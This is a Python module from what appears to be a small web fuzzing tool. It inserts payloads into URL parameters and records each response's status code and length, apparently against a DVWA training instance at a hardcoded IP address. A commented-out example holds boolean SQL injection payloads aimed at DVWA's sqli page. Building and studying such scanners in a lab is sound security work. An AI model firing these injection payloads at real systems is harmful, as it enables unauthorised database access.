from requests.utils import requote_uri
import requests
from .parse import parser
from .check_host_is_up import is_host_up
from .post_request import createSession
# from parse import parser
# from check_host_is_up import is_host_up
# from post_request import createSession


# payloads is common across all attack type, therefore we can simplify this by 
# giving payloads as argument

URL = "http://47.245.99.142/login.php"

def get_request(url: str, payloads: list, login_dvwa: bool = False):
    if (login_dvwa):
        session = createSession(URL) 
    else:
        session = requests.get
    if (not is_host_up(url)):
        raise requests.ConnectionError("Host is Down")
    parsed_text = parser(url, payloads)
    url_payload = list(map(requote_uri, parsed_text["url_payload"]))
    result = []
    for index, url in enumerate(url_payload):
        response = session.get(url)
        status_code = response.status_code
        try:
            content_length = response.headers["Content-Length"]
        except:
            content_length = len(response.text)
        result.append([payloads[index], status_code, content_length])
    return result


# if __name__ == "__main__":
    # get_request("http://47.245.99.142/vulnerabilities/sqli/?id=$1$&Submit=Submit#", ["OR 3409=3409 AND ('pytW' LIKE 'pytW", "OR 3409=3409 AND ('pytW' LIKE 'pytY"], login_dvwa=True)